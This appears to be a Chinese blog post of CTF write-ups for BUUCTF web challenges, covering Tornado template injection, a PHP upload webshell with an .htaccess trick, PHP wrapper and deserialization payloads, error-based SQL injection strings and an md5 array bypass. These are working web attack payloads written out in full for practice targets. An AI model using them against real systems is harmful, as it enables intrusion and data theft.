<meta property="og:image" content="http://example.com/images/8546C70DBD82478dA964ADFBC67556C4.png">
<meta property="og:image" content="http://example.com/images/4A2117B4B784427082E78CEA98CFD4FC.png">
<meta property="og:image" content="http://example.com/images/6846416A39CC4aea908BCAC145997748.png">
<meta property="og:image" content="http://example.com/images/9CCAFF648B8A4c50805D05687CF5A2F7.png">
<meta property="og:image" content="http://example.com/images/D6CB2DBB23DC4b458FD2AD853C6C7FDC.png">
<meta property="og:image" content="http://example.com/images/6772E1B0EC1549c4ABF74D13DCC94062.png">
<meta property="og:image" content="http://example.com/images/E9557FBEE74B428f9A3C80EAF2AE792C.png">
<meta property="og:image" content="http://example.com/images/04C366AE5B5F43908D4449A029E965A4.png">
<meta property="og:image" content="http://example.com/images/C19D81C0EE214c5dBEA86E2EFBA4AD04.png">
<meta property="og:image" content="http://example.com/images/DA04F3C07BA94df6B6419D4B06D8C0E5.png">
<meta property="og:image" content="http://example.com/images/3DA0E481B463490598C7C62F0476AFAA.png">
<meta property="og:image" content="http://example.com/images/5E8B6A2B84874d5aB96D9C08D5A14DCE.png">
<meta property="og:image" content="http://example.com/images/1C405726F5864566869EAEE0A90C739F.png">
<meta property="og:image" content="http://example.com/images/DA85CFA3CC984288BE37C16381C0C16A.png">
<meta property="og:image" content="http://example.com/images/2CF1C9ADAA194de4983AB14648960461.png">
<meta property="og:image" content="http://example.com/images/CBCE1EEE41844d31AAD77BE074166FF6.png">
<meta property="og:image" content="http://example.com/images/C2CD59FD343F419f8C6158AB4F7E32A8.png">
<meta property="og:image" content="http://example.com/images/18C386A2669542c6BC3E6158FF1F4C5F.png">
<meta property="article:published_time" content="2023-12-19T16:00:00.000Z">
<meta property="article:modified_time" content="2024-09-10T13:18:38.971Z">
<meta property="article:author" content="奇怪的奇怪">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/images/0AYQ%25Q.png">
  
  
  
  <title>buuctf_web - 奇怪的亚索</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>奇怪的亚索</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="buuctf_web"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-20 00:00" pubdate>
          2023年12月20日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          203k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1689 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buuctf_web</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="护网杯-2018-easy-tornado-1"><a href="#护网杯-2018-easy-tornado-1" class="headerlink" title="[护网杯 2018]easy_tornado 1"></a>[护网杯 2018]easy_tornado 1</h2><p>进入答题页面，发现三个超链接<br>分别点击进去<br>再点击进去后url中传输了两个参数，一个是filename，另一个是filehash，在第一个flag.txt中把filename改为提示的&#x2F;fllllllllllllag试试<br><img src="/images/0AYQ%25Q.png" srcset="/img/loading.gif" lazyload><br>提交后页面显示error<br><img src="/images/0C.png" srcset="/img/loading.gif" lazyload><br>看来拿到flag的关键就在于解出filehash是什么，根据第三个超链接的提示，应该是filehash&#x3D;md5(cookie_secret+md5(filename))，filename现已知，但cookie_secret是什么呢，而且第二个rander也没有用到，也并不清楚有什么用，只能去查一下tornado框架有什么特点了<br><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/">tornado框架的介绍</a><br><img src="/images/17dc88e290814aba95813a751925fb5f.png" srcset="/img/loading.gif" lazyload></p>
<p>我们在这个文档里面可以知道cookie_secret并不像我们的cookie一样可以自己修改的(不是自己的cookie)，而是包含了时间戳，HMAC签名和编码后的cookie值，所以我们自己修改cookie并不现实。<br>想到render会不会是cookie_secret的突破点，找一下render作用</p>
<p>render意为渲染;self.render(“entry.html”,entry&#x3D;entry)该语句意思就是找到entry.html这个模板，用右边这个entry来实例化entry.html模板中的entry参数，从而显示在页面上。</p>
<p>回过头发现flag.txt那个Error的页面有一个参数msg也是等于Error<br><img src="/images/ZMS.png" srcset="/img/loading.gif" lazyload><br>发现msg可以左右页面的输出，想到之前有些题目利用一个参数可以出来phpinfo()等，因此现在目标就是怎么利用msg这个参数来找到cookie_secret了<br><img src="/images/5334f6e91090438aaa0ac22c05c26768.png" srcset="/img/loading.gif" lazyload><br>在文档中我们可以看到相关render渲染的作用，我们可以利用 <code>&#123;&#123;&#125;&#125;</code> 来把表达式传进去以获取我们想要的信息，这样我们猜想<code>msg=&#123;&#123;cookie的位置&#125;&#125;</code>来获得我们想要的<br><img src="/images/d2702883750b44daaabc93abd5f3255a.png" srcset="/img/loading.gif" lazyload><br>cookie_secret在Application对象settings的属性中，访问它的话就需要知道它的属性名字，根据查阅可知：self.application.settings有一个别名是RequestHandler.settings其中handler又是指向处理当前这个页面的RequestHandler对象<br>RequestHandler.settings指向self.application.settings<br>因此handler.settings指向RequestHandler.application.settings<br><img src="/images/Q2I.png" srcset="/img/loading.gif" lazyload><br>将handler.setting带入msg即可知道cookie_secret，再来一步步根据MD5来计算filehash</p>
<p><img src="/images/HQC2E6.png" srcset="/img/loading.gif" lazyload><br>回到hints.txt<br>现在已经知道了cookie_secret的值，MD5(filename)就是&#x2F;fllllllllllllag的MD5的值<br>&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>把cookie_secret和MD5(filename)加起来再进行MD5加密即可得出flag<br><img src="/images/DJ.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="MRCTF2020-你传你🐎呢-1"><a href="#MRCTF2020-你传你🐎呢-1" class="headerlink" title="[MRCTF2020]你传你🐎呢 1"></a>[MRCTF2020]你传你🐎呢 1</h2><p>这题是个文件上传题，按照老方法先上传一个木马1.png 内容：<code>&lt;?php evel($_POST[&#39;a&#39;]);?&gt;</code><br>再上传一个.user.ini：内容为<code>auto_prepend_file=1.png</code> 上传之后他会给一个连接，进入&#x2F;upload之后的连接，用蚁剑连接也不能成功连接，也写不了命令，那么我们只有换一种方法了。</p>
<p>先上传一个1.png文件<br>内容为：<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>再上传一个.htaccess文件，<br>内容为：<code>SetHandler application/x-httpd-php</code></p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误界面、改变文件拓展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能<br>这里htaccess内容的意思是设置当前目录所有文件都使用php解析</p>
<p>这里要记得把Content-Type的内容修改一下<br><img src="/images/Y7CUL3CBL.png" srcset="/img/loading.gif" lazyload><br>复制&#x2F;upload之后的url并进入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>:http://c59ecfdc-<span class="hljs-number">0</span>a3d-<span class="hljs-number">4</span>ed6-<span class="hljs-number">92</span>d7-<span class="hljs-number">74</span>b6bcc602d4.node4.buuoj.cn:<span class="hljs-number">81</span>/upload/<span class="hljs-number">7</span>a439cdf1a27a4860163c7641f0dc7fe/<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure>

<p>此时我们可以post输入命令</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>print_r(glob(<span class="hljs-string">&quot;/*&quot;</span>))<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>以获取flag</p>
<p>或以当前url连接中国蚁剑，以获取flag</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>打开之后是一段源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>一共有三个参数，都需要通过GET方式传入<br>isset的作用是检测变量是否已设置并且非null<br>file_get_contents的作用是将整个文件读入一个字符串<br>这里将text文件中读取字符串，还要和welcome to the zjctf相等<br>这里使用的是data:&#x2F;&#x2F;写入协议<br>payload：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure>

<p><img src="/images/DKORO.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>)</span></span><br></code></pre></td></tr></table></figure>

<p>正则表达式，说明file不能出现flag字符<br>但是源码提示了useless.php这里使用php伪协议来读取文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
<p><img src="/images/G3HD33.png" srcset="/img/loading.gif" lazyload></p>
<p>使用base64解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>这里最后会echo输出file<br>将flag.php的值给了file，然后反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>使用php编译器phpstorm<br><img src="/images/TMK81DK.png" srcset="/img/loading.gif" lazyload><br>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br></code></pre></td></tr></table></figure>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>用filter链漏洞来绕过，被禁用的flag<br>这里要用到一个工具php_filter_chain_generator<br><img src="/images/69D87BB8915344faA1258C05CC9D5DAC.png" srcset="/img/loading.gif" lazyload><br>同样查看源码就能看到flag了</p>
<p><img src="/images/B806122033314b9aB01D9B80BEE33AAF.png" srcset="/img/loading.gif" lazyload><br>查看源码即可看到flag</p>
<h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>sql注入题，先试试万能密码username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123<br><img src="/images/4RO.png" srcset="/img/loading.gif" lazyload><br>经过一系列尝试后，发现空格，&#x3D;，union都被过滤了<br>空格被过滤我们使用()来代替空格&#x2F;**&#x2F;貌似也被过滤了<br>既然如此，尝试一下报错注入<br><strong>爆库</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/YKR.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>爆表</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/VNTXAGU.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>爆字段</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p>
<p><img src="/images/16B3IU.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>爆值</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br><img src="/images/M3HJZ8NQ67JFV.png" srcset="/img/loading.gif" lazyload><br>并没有成功显示flag，只显示了一半~<br>经过查询知道了right()可以查询后面的部分<br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>和前面显示出的flag拼接删改得到完整的flag</p>
<h2 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h2><p>直接给出源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br>Please input first<br><br></code></pre></td></tr></table></figure>


<p>发现第五个if可以获得flag<br>先第一个if<br><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;]))</code><br>isset检查是否有效，随便输一个字符就能通过<br>第二个if<br><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code><br>绕过这个if要先想到MD5漏洞，我先想到的是0e开头的漏洞<br>ps:md5 值是 0e 开头，在 php 弱类型比较中判断为相等<br>再看回来，弱比较是&#x3D;&#x3D;，而本题中是&#x3D;&#x3D;&#x3D;强比较，所以不能用这个绕过<br>在查阅后发现还有一种方法——数组绕过<code>a[]=a&amp;b[]=b</code><br>虽然会报错，但判断为真，判断为null&#x3D;&#x3D;&#x3D;null<br>而且id!&#x3D;gg<br>payload:<code>?gg[]=gg&amp;id[]=id</code><br><img src="/images/XNP4L0FHEL.png" srcset="/img/loading.gif" lazyload><br>You got the first steponly one way to get the flag</p>
<p>得到了我们需要的结果you got the first step<br>但多出来一句 only one way to get the flag<br>查看源代码发现是这一句是第三个if的else语句，说明第三个if并未绕过，<br><code>if(isset($_POST[&#39;passwd&#39;]))</code><br>同样随便post一个字符就能绕过</p>
